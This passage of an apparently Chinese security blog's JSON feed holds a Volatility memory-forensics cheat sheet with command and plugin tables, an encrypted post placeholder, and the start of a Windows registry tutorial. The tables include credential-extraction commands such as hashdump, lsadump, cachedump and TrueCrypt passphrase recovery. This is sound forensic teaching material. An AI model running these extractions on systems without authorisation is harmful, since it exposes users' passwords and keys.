-f 1.vmem --profile=Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>14.扫描所有的文件列表 filescan</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 filescan</span><br></pre></td></tr></table></figure>\n\n<p>（linux配合 grep 命令进行相关字符定向扫描，如：grep flag、grep -E ‘png|jpg|gif|zip|rar|7z|pdf|txt|doc’）</p>\n<p>例</p>\n<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 filescan grep “flag.txt”</p>\n<p>cat system.txt|grep -i computername</p>\n<p><strong>15.查看文件内容dmpfiles</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D ./</span><br></pre></td></tr></table></figure>\n\n<p>需要指定偏移量 -Q 和输出目录 -D</p>\n<p>dumpfiles：导出某一文件(指定虚拟地址)</p>\n<p>16.查看当前展示的notepad内容 notepad</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 notepad</span><br></pre></td></tr></table></figure>\n\n<p>查看当前展示的 notepad 文本（–profile&#x3D;winxp啥的低版本可以，win7的不行，可以尝试使用editbox）</p>\n<p>17.显示有关编辑控件（曾经编辑过的内容）的信息 editbox</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 editbox</span><br></pre></td></tr></table></figure>\n\n<p>editbox：显示有关编辑控件（曾经编辑过的内容）的信息 查看内存中记事本的内容</p>\n<p>18.提取进程memdump</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 memdump -p xxx --dump-dir=./</span><br></pre></td></tr></table></figure>\n\n<p>memdump：提取出指定进程，常用foremost 来分离里面的文件  </p>\n<p>需要指定进程-p [pid] 和输出目录 -D</p>\n<p>memdump -p 332 -D XX&#x2F;   </p>\n<p>提取进程   -p 进程号 -D 当前输出路径（导出为332.dmp）</p>\n<p>dump出来的进程文件，可以使用 foremost 来分离里面的文件，用 binwak -e 不推荐</p>\n<p>strings -e l 2040.dmp | grep flag 查找flag</p>\n<p>19.屏幕截图screenshot</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 screenshot --dump-dir=./</span><br></pre></td></tr></table></figure>\n\n<p>screenshot：保存基于GDI窗口的伪截屏</p>\n<p><strong>20.查看注册表配置单元hivelist</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure>\n\n<p>hivelist: 列出所有的注册表项及其虚拟地址和物理地址</p>\n<p>21.查看注册表键名hivedmp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 hivedump -o 0xfffff8a001032410</span><br></pre></td></tr></table></figure>\n\n\n\n<p>22.查看注册表键值printkey</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &quot;ControlSet001\\Control\\ComputerName\\ComputerName&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>23.获取主机名 printkey</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &quot;ControlSet001\\Control\\ComputerName\\ComputerName&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>24.列出用户名 pringkey</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>25.查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等。userassist</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 userassist</span><br></pre></td></tr></table></figure>\n\n\n\n<p>26.最大程序提取信息timeliner</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 timeliner</span><br></pre></td></tr></table></figure>\n\n<p>timeliner: 将所有操作系统事件以时间线的方式展开</p>\n<p>27.查看剪贴板信息clipboard</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure>\n\n<p>clipboard：查看剪贴板信息</p>\n<p><strong>28.显示关于计算机及其操作系统的详细配置信息（插件）systeminfo</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 systeminfo</span><br></pre></td></tr></table></figure>\n\n<p>systeminfo：显示关于计算机及其操作系统的详细配置信息（插件）</p>\n<p>29.恢复被删除的文件mftparser</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 mftparser</span><br></pre></td></tr></table></figure>\n\n<p>mftparser：恢复被删除的文件</p>\n<p>30.查看环境变量envars</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 envars</span><br></pre></td></tr></table></figure>\n\n<p>envars：查看环境变量</p>\n<p>31.列出某一进程加载的所有dll文件dlllist</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 dlllist -p 2588</span><br></pre></td></tr></table></figure>\n\n<p>dlllist: 列出某一进程加载的所有dll文件</p>\n<p>需要指定进程-p [pid]</p>\n<p>32.程序版本信息 verinfo</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 verinfo</span><br></pre></td></tr></table></figure>\n\n<p>列出PE｜程序版本信息</p>\n<p><strong>33.产看进程树，可以轻松了解各进程之间的关系：父进程与子进程 pstree</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 2008.raw –profile=Win2008R2SP1x64 pstree</span><br></pre></td></tr></table></figure>\n\n<p>在进程中PPID比PID还大，那就可能这个进程有异常程序</p>\n<p>34.从内存文件中找到异常程序植入到系统的开机自启痕迹 shimcache</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 2008.raw –profile=Win2008R2SP1x64 shimcache</span><br></pre></td></tr></table></figure>\n\n\n\n<p>35.提取注册表数据\tdumpregistry</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 2008.raw –profile=Win2008R2SP1x64 dumpregistry</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<table>\n<thead>\n<tr>\n<th><strong>插件名称</strong></th>\n<th><strong>功能</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>amcache</td>\n<td>查看AmCache应用程序痕迹信息</td>\n</tr>\n<tr>\n<td>apihooks</td>\n<td>检测内核及进程的内存空间中的API hook</td>\n</tr>\n<tr>\n<td>atoms</td>\n<td>列出会话及窗口站atom表</td>\n</tr>\n<tr>\n<td>atomscan</td>\n<td>Atom表的池扫描(Pool scanner)</td>\n</tr>\n<tr>\n<td>auditpol</td>\n<td>列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息</td>\n</tr>\n<tr>\n<td>bigpools</td>\n<td>使用BigPagePoolScanner转储大分页池(big page pools)</td>\n</tr>\n<tr>\n<td>bioskbd</td>\n<td>从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)</td>\n</tr>\n<tr>\n<td>cachedump</td>\n<td>获取内存中缓存的域帐号的密码哈希</td>\n</tr>\n<tr>\n<td>callbacks</td>\n<td>打印全系统通知例程</td>\n</tr>\n<tr>\n<td>clipboard</td>\n<td>提取Windows剪贴板中的内容</td>\n</tr>\n<tr>\n<td>cmdline</td>\n<td>显示进程命令行参数</td>\n</tr>\n<tr>\n<td>cmdscan</td>\n<td>提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）</td>\n</tr>\n<tr>\n<td>connections</td>\n<td>打印系统打开的网络连接(仅支持Windows XP 和2003)</td>\n</tr>\n<tr>\n<td>connscan</td>\n<td>打印TCP连接信息</td>\n</tr>\n<tr>\n<td>consoles</td>\n<td>提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）</td>\n</tr>\n<tr>\n<td>crashinfo</td>\n<td>提取崩溃转储信息</td>\n</tr>\n<tr>\n<td>deskscan</td>\n<td>tagDESKTOP池扫描(Poolscaner)</td>\n</tr>\n<tr>\n<td>devicetree</td>\n<td>显示设备树信息</td>\n</tr>\n<tr>\n<td>dlldump</td>\n<td>从进程地址空间转储动态链接库</td>\n</tr>\n<tr>\n<td>dlllist</td>\n<td>打印每个进程加载的动态链接库列表</td>\n</tr>\n<tr>\n<td>driverirp</td>\n<td>IRP hook驱动检测</td>\n</tr>\n<tr>\n<td>drivermodule</td>\n<td>关联驱动对象至内核模块</td>\n</tr>\n<tr>\n<td>driverscan</td>\n<td>驱动对象池扫描</td>\n</tr>\n<tr>\n<td>dumpcerts</td>\n<td>提取RAS私钥及SSL公钥</td>\n</tr>\n<tr>\n<td>dumpfiles</td>\n<td>提取内存中映射或缓存的文件</td>\n</tr>\n<tr>\n<td>dumpregistry</td>\n<td>转储内存中注册表信息至磁盘</td>\n</tr>\n<tr>\n<td>editbox</td>\n<td>查看Edit编辑控件信息 (Listbox正在实验中)</td>\n</tr>\n<tr>\n<td>envars</td>\n<td>显示进程的环境变量</td>\n</tr>\n<tr>\n<td>eventhooks</td>\n<td>打印Windows事件hook详细信息</td>\n</tr>\n<tr>\n<td>evtlogs</td>\n<td>提取Windows事件日志（仅支持XP&#x2F;2003)</td>\n</tr>\n<tr>\n<td>filescan</td>\n<td>提取文件对象（file objects）池信息</td>\n</tr>\n<tr>\n<td>gahti</td>\n<td>转储用户句柄（handle）类型信息</td>\n</tr>\n<tr>\n<td>gditimers</td>\n<td>打印已安装的GDI计时器(timers)及回调(callbacks)</td>\n</tr>\n<tr>\n<td>gdt</td>\n<td>显示全局描述符表(Global Deor Table)</td>\n</tr>\n<tr>\n<td>getservicesids</td>\n<td>获取注册表中的服务名称并返回SID信息</td>\n</tr>\n<tr>\n<td>getsids</td>\n<td>打印每个进程的SID信息</td>\n</tr>\n<tr>\n<td>handles</td>\n<td>打印每个进程打开的句柄的列表</td>\n</tr>\n<tr>\n<td>hashdump</td>\n<td>转储内存中的Windows帐户密码哈希(LM&#x2F;NTLM)</td>\n</tr>\n<tr>\n<td>hibinfo</td>\n<td>转储休眠文件信息</td>\n</tr>\n<tr>\n<td>hivedump</td>\n<td>打印注册表配置单元信息</td>\n</tr>\n<tr>\n<td>hivelist</td>\n<td>打印注册表配置单元列表</td>\n</tr>\n<tr>\n<td>hivescan</td>\n<td>注册表配置单元池扫描</td>\n</tr>\n<tr>\n<td>hpakextract</td>\n<td>从HPAK文件（Fast Dump格式）提取物理内存数据</td>\n</tr>\n<tr>\n<td>hpakinfo</td>\n<td>查看HPAK文件属性及相关信息</td>\n</tr>\n<tr>\n<td>idt</td>\n<td>显示中断描述符表(Interrupt Deor Table)</td>\n</tr>\n<tr>\n<td>iehistory</td>\n<td>重建IE缓存及访问历史记录</td>\n</tr>\n<tr>\n<td>imagecopy</td>\n<td>将物理地址空间导出原生DD镜像文件</td>\n</tr>\n<tr>\n<td>imageinfo</td>\n<td>查看&#x2F;识别镜像信息</td>\n</tr>\n<tr>\n<td>impscan</td>\n<td>扫描对导入函数的调用</td>\n</tr>\n<tr>\n<td>joblinks</td>\n<td>打印进程任务链接信息</td>\n</tr>\n<tr>\n<td>kdbgscan</td>\n<td>搜索和转储潜在KDBG值</td>\n</tr>\n<tr>\n<td>kpcrscan</td>\n<td>搜索和转储潜在KPCR值</td>\n</tr>\n<tr>\n<td>ldrmodules</td>\n<td>检测未链接的动态链接DLL</td>\n</tr>\n<tr>\n<td>lsadump</td>\n<td>从注册表中提取LSA密钥信息（已解密）</td>\n</tr>\n<tr>\n<td>machoinfo</td>\n<td>转储Mach-O 文件格式信息</td>\n</tr>\n<tr>\n<td>malfind</td>\n<td>查找隐藏的和插入的代码</td>\n</tr>\n<tr>\n<td>mbrparser</td>\n<td>扫描并解析潜在的主引导记录(MBR)</td>\n</tr>\n<tr>\n<td>memdump</td>\n<td>转储进程的可寻址内存</td>\n</tr>\n<tr>\n<td>memmap</td>\n<td>打印内存映射</td>\n</tr>\n<tr>\n<td>messagehooks</td>\n<td>桌面和窗口消息钩子的线程列表</td>\n</tr>\n<tr>\n<td>mftparser</td>\n<td>扫描并解析潜在的MFT条目</td>\n</tr>\n<tr>\n<td>moddump</td>\n<td>转储内核驱动程序到可执行文件的示例</td>\n</tr>\n<tr>\n<td>modscan</td>\n<td>内核模块池扫描</td>\n</tr>\n<tr>\n<td>modules</td>\n<td>打印加载模块的列表</td>\n</tr>\n<tr>\n<td>multiscan</td>\n<td>批量扫描各种对象</td>\n</tr>\n<tr>\n<td>mutantscan</td>\n<td>对互斥对象池扫描</td>\n</tr>\n<tr>\n<td>notepad</td>\n<td>查看记事本当前显示的文本</td>\n</tr>\n<tr>\n<td>objtypescan</td>\n<td>扫描窗口对象类型对象</td>\n</tr>\n<tr>\n<td>patcher</td>\n<td>基于页面扫描的补丁程序内存</td>\n</tr>\n<tr>\n<td>poolpeek</td>\n<td>可配置的池扫描器插件</td>\n</tr>\n<tr>\n<td>printkey</td>\n<td>打印注册表项及其子项和值</td>\n</tr>\n<tr>\n<td>privs</td>\n<td>显示进程权限</td>\n</tr>\n<tr>\n<td>procdump</td>\n<td>进程转储到一个可执行文件示例</td>\n</tr>\n<tr>\n<td>pslist</td>\n<td>按照EPROCESS列表打印所有正在运行的进程</td>\n</tr>\n<tr>\n<td>psscan</td>\n<td>进程对象池扫描</td>\n</tr>\n<tr>\n<td>pstree</td>\n<td>以树型方式打印进程列表</td>\n</tr>\n<tr>\n<td>psxview</td>\n<td>查找带有隐藏进程的所有进程列表</td>\n</tr>\n<tr>\n<td>qemuinfo</td>\n<td>转储Qemu 信息</td>\n</tr>\n<tr>\n<td>raw2dmp</td>\n<td>将物理内存原生数据转换为windbg崩溃转储格式</td>\n</tr>\n<tr>\n<td>screenshot</td>\n<td>基于GDI Windows的虚拟屏幕截图保存</td>\n</tr>\n<tr>\n<td>servicediff</td>\n<td>Windows服务列表(ala Plugx)</td>\n</tr>\n<tr>\n<td>sessions</td>\n<td>_MM_SESSION_SPACE的详细信息列表(用户登录会话)</td>\n</tr>\n<tr>\n<td>shellbags</td>\n<td>打印Shellbags信息</td>\n</tr>\n<tr>\n<td>shimcache</td>\n<td>解析应用程序兼容性Shim缓存注册表项</td>\n</tr>\n<tr>\n<td>shutdowntime</td>\n<td>从内存中的注册表信息获取机器关机时间</td>\n</tr>\n<tr>\n<td>sockets</td>\n<td>打印已打开套接字列表</td>\n</tr>\n<tr>\n<td>sockscan</td>\n<td>TCP套接字对象池扫描</td>\n</tr>\n<tr>\n<td>ssdt</td>\n<td>显示SSDT条目</td>\n</tr>\n<tr>\n<td>strings</td>\n<td>物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</td>\n</tr>\n<tr>\n<td>svcscan</td>\n<td>Windows服务列表扫描</td>\n</tr>\n<tr>\n<td>symlinkscan</td>\n<td>符号链接对象池扫描</td>\n</tr>\n<tr>\n<td>thrdscan</td>\n<td>线程对象池扫描</td>\n</tr>\n<tr>\n<td>threads</td>\n<td>调查_ETHREAD 和_KTHREADs</td>\n</tr>\n<tr>\n<td>timeliner</td>\n<td>创建内存中的各种痕迹信息的时间线</td>\n</tr>\n<tr>\n<td>timers</td>\n<td>打印内核计时器及关联模块的DPC</td>\n</tr>\n<tr>\n<td>truecryptmaster</td>\n<td>恢复TrueCrypt 7.1a主密钥</td>\n</tr>\n<tr>\n<td>truecryptpassphrase</td>\n<td>查找并提取TrueCrypt密码</td>\n</tr>\n<tr>\n<td>truecryptsummary</td>\n<td>TrueCrypt摘要信息</td>\n</tr>\n<tr>\n<td>unloadedmodules</td>\n<td>打印卸载的模块信息列表</td>\n</tr>\n<tr>\n<td>userassist</td>\n<td>打印注册表中UserAssist相关信息</td>\n</tr>\n<tr>\n<td>userhandles</td>\n<td>转储用户句柄表</td>\n</tr>\n<tr>\n<td>vaddump</td>\n<td>转储VAD数据为文件</td>\n</tr>\n<tr>\n<td>vadinfo</td>\n<td>转储VAD信息</td>\n</tr>\n<tr>\n<td>vadtree</td>\n<td>以树形方式显示VAD树信息</td>\n</tr>\n<tr>\n<td>vadwalk</td>\n<td>显示遍历VAD树</td>\n</tr>\n<tr>\n<td>vboxinfo</td>\n<td>转储Virtualbox信息（虚拟机）</td>\n</tr>\n<tr>\n<td>verinfo</td>\n<td>打印PE镜像中的版本信息</td>\n</tr>\n<tr>\n<td>vmwareinfo</td>\n<td>转储VMware VMSS&#x2F;VMSN 信息</td>\n</tr>\n<tr>\n<td>volshell</td>\n<td>内存镜像中的shell</td>\n</tr>\n<tr>\n<td>windows</td>\n<td>打印桌面窗口(详细信息)</td>\n</tr>\n<tr>\n<td>wintree</td>\n<td>Z顺序打印桌面窗口树</td>\n</tr>\n<tr>\n<td>wndscan</td>\n<td>池扫描窗口站</td>\n</tr>\n<tr>\n<td>yarascan</td>\n<td>以Yara签名扫描进程或内核内存</td>\n</tr>\n</tbody></table>\n<h3 id><a href=\"#\" class=\"headerlink\" title></a></h3><table>\n<thead>\n<tr>\n<th><strong>功能</strong></th>\n<th><strong>命令行及参数</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>查看进程列表</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 pslist</td>\n</tr>\n<tr>\n<td>查看进程列表（树形）</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 pstree</td>\n</tr>\n<tr>\n<td>查看进程列表(psx视图)</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 psxview</td>\n</tr>\n<tr>\n<td>查看网络通讯连接</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 netscan</td>\n</tr>\n<tr>\n<td>查看加载的动态链接库</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 dlllist</td>\n</tr>\n<tr>\n<td>查看SSDT表</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 ssdt</td>\n</tr>\n<tr>\n<td>查看UserAssist痕迹</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 userassist</td>\n</tr>\n<tr>\n<td>查看ShimCache痕迹</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 shimcache</td>\n</tr>\n<tr>\n<td>查看ShellBags</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 shellbags</td>\n</tr>\n<tr>\n<td>查看服务列表</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 svcscan</td>\n</tr>\n<tr>\n<td>查看Windows帐户hash</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 hashdump</td>\n</tr>\n<tr>\n<td>查看最后关机时间</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 shutdowntime</td>\n</tr>\n<tr>\n<td>查看IE历史记录</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 iehistory</td>\n</tr>\n<tr>\n<td>提取注册表数据</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 dumpregistry</td>\n</tr>\n<tr>\n<td>解析MFT记录</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 mftparser</td>\n</tr>\n<tr>\n<td>导出MFT记录,恢复文件</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 mftparser –output-file&#x3D;mftverbose.txt -D mftoutput</td>\n</tr>\n<tr>\n<td>获取TrueCrypt密钥信息</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 truecryptmaster</td>\n</tr>\n<tr>\n<td>获取TrueCrypt密码信息</td>\n<td>Vol.exe -f Win7_SP1_x86.vmem –profile&#x3D;Win7SP1x86 truecryptpassphras</td>\n</tr>\n</tbody></table>\n",
            "tags": [
                "转载",
                "工具"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/03/18/dishui-note/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91%E2%80%94C%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/",
            "url": "https://w-sqrt7.github.io/2024/03/18/dishui-note/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91%E2%80%94C%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/",
            "title": "滴水逆向—C语言笔记",
            "date_published": "2024-03-18T07:07:46.041Z",
            "content_html": "<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"抱歉, 这个密码看着不太对, 请再试试.\" data-whm=\"抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"2a15ba59c4896afc5fa4ddbe32a240d5219ebe4179445230efa2eb28419be4cb\">e05d9ee6e48268b2b742c6d6f1681d6164fa5aa1dc52a0c978370e90ed17c302a63a466df9fb22fcb8ce418c71d391ef7045c9a0362206f2cec6024735d3437bddffa4cd87005b935983f7fc71381175608b9e2e92623ea511ca2c0267e1b7e53d8f7241da9b1f3a7cf840fbf0cf1e2fd74440faf85e9f652188ffaee1fef998428181ca374288c30a02dcb276a717806121e68d2f03adea7e4664eaaefd0577ff0780518d39e0e33ef7cf272493dac76470d90ff969cf8eb440fc6a01e4b71a3f40c5dd3d70bacd39e396c0d3127ee1</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">您好, 这里需要密码.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">",
            "tags": [
                "原创",
                "逆向",
                "C语言"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/03/18/other/basic/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%86%85%E5%AE%B9%E8%AF%A6%E8%A7%A3/",
            "url": "https://w-sqrt7.github.io/2024/03/18/other/basic/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%86%85%E5%AE%B9%E8%AF%A6%E8%A7%A3/",
            "title": "Windows注册表内容详解",
            "date_published": "2024-03-18T03:28:52.896Z",
            "content_html": "<h1 id=\"Windows注册表内容详解\"><a href=\"#Windows注册表内容详解\" class=\"headerlink\" title=\"Windows注册表内容详解\"></a>Windows注册表内容详解</h1><p><strong>原文链接：<a href=\"http://blog.sina.com.cn/s/blog_4d41e2690100q33v.html\">http://blog.sina.com.cn/s/blog_4d41e2690100q33v.html</a></strong></p>\n<p>有效链接：<a href=\"https://www.cnblogs.com/sepmaple/articles/9401215.html\">https://www.cnblogs.com/sepmaple/articles/9401215.html</a></p>\n<h2 id=\"第一课-注册表基础\"><a href=\"#第一课-注册表基础\" class=\"headerlink\" title=\"第一课  注册表基础\"></a>第一课  注册表基础</h2><h3 id=\"一、什么是注册表\"><a href=\"#一、什么是注册表\" class=\"headerlink\" title=\"一、什么是注册表\"></a>一、什么是注册表</h3><p>​\t注册表是windows操作系统、硬件设备以及客户应用程序得以正常运行和保存设置的核心“数据库”，也可以说是一个非常巨大的树状分层结构的数据库系统。<br>​    注册表记录了用户安装在计算机上的软件和每个程序的相互关联信息，它包括了计算机的硬件配置，包括自动配置的即插即用的设备和已有的各种设备说明、状态属性以及各种状态信息和数据。利用一个功能强大的注册表数据库来统一集中地管理系统硬件设施、软件配置等信息，从而方便了管理，增强了系统的稳定性。</p>\n<h3 id=\"二、注册表的功能\"><a href=\"#二、注册表的功能\" class=\"headerlink\" title=\"二、注册表的功能\"></a>二、注册表的功能</h3><p>​\t刚才我们看到了，注册表中记录了用户安装在计算机上的软件和每个程序的相关信息，通过它可以控制硬件、软件、用户环境和操作系统界面的数据信息文件。<br>​\t相关知识：注册表文件的数据信息保存在system.dat和user.dat中、利用regedit.exe程序能够存取注册表文件（其实大家可能也知道regedt32.exe，这两个程序是一样的）</p>\n<h3 id=\"三、编辑器说明：\"><a href=\"#三、编辑器说明：\" class=\"headerlink\" title=\"三、编辑器说明：\"></a>三、编辑器说明：</h3><p>在运行里键入<strong>regedit</strong>就可以进入了</p>\n<p>根键：这个称为HKEY…………，某一项的句柄项：附加的文件夹和一个或多个值<br>子项：在某一个项（父项）下面出现的项（子项）<br>值项：带有一个名称和一个值的有序值，每个项都可包括任何数量的值项，值项由三个部分组成：名称、数据类型和数据。</p>\n<p>1、名称：不包括反斜线的字符、数字、代表符和空格的任意组合。同一键中不可有相同的名称<br>2、数据类型：包括字符串、二进制和双字节等<br>3、数据：值项的具体值，它的大小可以占用64KB</p>\n<h2 id=\"第二课-总体结构分析\"><a href=\"#第二课-总体结构分析\" class=\"headerlink\" title=\"第二课  总体结构分析\"></a>第二课  总体结构分析</h2><h3 id=\"注册表包括以下5个根键\"><a href=\"#注册表包括以下5个根键\" class=\"headerlink\" title=\"注册表包括以下5个根键\"></a>注册表包括以下5个根键</h3><p><strong>1.HKEY_CLASSES_ROOT</strong><br>说明：该根键包括启动应用程序所需的全部信息，包括扩展名，应用程序与文档之间的关系，驱动程序名，DDE和OLE信息，类ID编号和应用程序与文档的图标等。</p>\n<p><strong>2.HKEY_CURRENT_USER</strong><br>说明：该根键包括当前登录用户的配置信息，包括环境变量，个人程序以及桌面设置等</p>\n<p><strong>3.HKEY_LOCAL_MACHINE</strong><br>说明：该根键包括本地计算机的系统信息，包括硬件和操作系统信息，安全数据和计算机专用的各类软件设置信息</p>\n<p><strong>4.HKEY_USERS</strong><br>说明：该根键包括计算机的所有用户使用的配置数据，这些数据只有在用户登录系统时才能访问。这些信息告诉系统当前用户使用的图标，激活的程序组，开始菜单的内容以及颜色，字体</p>\n<p><strong>5.HKEY_CURRENT_CONFIG</strong><br>说明：该根键包括当前硬件的配置信息，其中的信息是从HKEY_LOCAL_MACHINE中映射出来的。</p>\n<h2 id=\"第三课-HKEY-CLASSES-ROOT\"><a href=\"#第三课-HKEY-CLASSES-ROOT\" class=\"headerlink\" title=\"第三课 HKEY_CLASSES_ROOT\"></a>第三课 